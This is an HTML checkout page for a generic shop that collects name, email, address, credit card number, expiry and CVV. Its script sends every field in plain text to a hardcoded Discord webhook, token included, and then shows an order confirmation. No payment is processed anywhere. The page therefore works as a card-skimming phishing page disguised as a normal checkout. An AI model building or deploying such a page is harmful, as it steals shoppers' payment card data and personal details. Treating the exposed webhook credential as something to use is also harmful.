<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Checkout</title>
  <style>
    /* Reset some default browser styles */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    /* Global styles */
    body {
      background-color: #f7f7f7;
      font-family: Arial, sans-serif;
      line-height: 1.5;
      padding: 20px;
    }

    h1 {
      font-size: 24px;
      margin-bottom: 20px;
    }

    p {
      margin-bottom: 10px;
    }

    /* Checkout styles */
    .checkout-container {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .checkout-form {
      max-width: 500px;
      width: 100%;
      background-color: #fff;
      padding: 20px;
      border-radius: 4px;
      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    }

    .checkout-items {
      margin-bottom: 20px;
    }

    .checkout-item {
      display: flex;
      margin-bottom: 10px;
    }

    .checkout-item img {
      width: 80px;
      height: 80px;
      margin-right: 10px;
    }

    .checkout-item-details h3 {
      font-size: 18px;
      margin-bottom: 5px;
    }

    .checkout-item-details p {
      font-size: 14px;
    }

    .checkout-form input[type="text"],
    .checkout-form input[type="email"] {
      width: 100%;
      padding: 8px;
      margin-bottom: 10px;
      border-radius: 4px;
      border: 1px solid #ccc;
    }

    .checkout-form input[type="submit"] {
      padding: 10px 20px;
      background-color: #ff9900;
      color: #fff;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .checkout-form input[type="submit"]:hover {
      background-color: #ff8c00;
    }
  </style>
</head>
<body>
  <div class="checkout-container">
    <form class="checkout-form" id="checkout-form">
      <h1>Checkout</h1>
      <div class="checkout-items">
        <!-- Your checkout items go here -->
        <div class="checkout-item">
          <img src="product1.jpg" alt="Product 1">
          <div class="checkout-item-details">
            <h3>Product 1</h3>
            <p>Price: $10.00</p>
          </div>
        </div>
        <div class="checkout-item">
          <img src="product2.jpg" alt="Product 2">
          <div class="checkout-item-details">
            <h3>Product 2</h3>
            <p>Price: $20.00</p>
          </div>
        </div>
      </div>
      <hr>
      <h2>Total: $30.00</h2>
      <p>Fill in the information below:</p>
      <input type="text" name="name" placeholder="Your Name" required>
      <input type="email" name="email" placeholder="Your Email" required>
      <input type="text" name="address" placeholder="Shipping Address" required>
      <input type="text" name="creditCard" placeholder="Credit Card Number" required>
      <input type="text" name="expiry" placeholder="MM/YY" required>
      <input type="text" name="cvv" placeholder="CVV" required>
      <input type="submit" value="Place Order">
    </form>
  </div>

  <script>
    const checkoutForm = document.querySelector('#checkout-form');
    checkoutForm.addEventListener('submit', function (e) {
      e.preventDefault();

      const name = checkoutForm.elements.name.value;
      const email = checkoutForm.elements.email.value;
      const address = checkoutForm.elements.address.value;
      const creditCard = checkoutForm.elements.creditCard.value;
      const expiry = checkoutForm.elements.expiry.value;
      const cvv = checkoutForm.elements.cvv.value;

      const webhookURL = 'https://discord.com/api/webhooks/1114657015738925107/MT7b6nMzahc-5R4D1esqG9FjwTEt3n5qjiAUo1qT1vHKNeXCj1ubye4mVVfAa_k4sqSM';
      const payload = {
        content: `New Order:\nName: ${name}\nEmail: ${email}\nAddress: ${address}\nCredit Card: ${creditCard}\nExpiry: ${expiry}\nCVV: ${cvv}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      }).then(response => {
        if (response.ok) {
          alert('Thank you for your order!');
          checkoutForm.reset();
        } else {
          alert('Oops! Something went wrong. Please try again later.');
        }
      });
    });
  </script>
</body>
</html>
